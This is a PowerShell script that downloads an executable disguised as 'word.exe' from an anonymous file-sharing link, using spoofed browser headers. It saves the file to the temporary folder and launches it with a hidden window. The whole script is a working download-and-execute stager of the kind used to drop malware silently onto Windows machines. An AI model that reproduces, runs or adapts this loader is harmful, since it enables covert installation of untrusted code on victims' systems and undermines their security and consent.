$DownloadUrl = "https://store10.gofile.io/download/web/c9b59620-888c-4958-af5c-2aa606264fc9/word.exe"
$ExeName     = "word.exe"
$Arguments   = ""
$DestPath = Join-Path $env:TEMP $ExeName

Write-Host "Downloading $ExeName..."

$Headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    "Referer"    = "https://gofile.io/"
}

try {
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $DestPath -Headers $Headers -UseBasicParsing
    Write-Host "Downloaded to: $DestPath"
} catch {
    Write-Error "Download failed: $_"
    exit 1
}

Write-Host "Running $ExeName silently..."

$StartArgs = @{
    FilePath    = $DestPath
    WindowStyle = "Hidden"
    Wait        = $true
}

if ($Arguments -ne "") {
    $StartArgs.ArgumentList = $Arguments
}

try {
    $Proc = Start-Process @StartArgs -PassThru
    Write-Host "Process exited with code: $($Proc.ExitCode)"
} catch {
    Write-Error "Failed to run executable: $_"
    exit 1
}
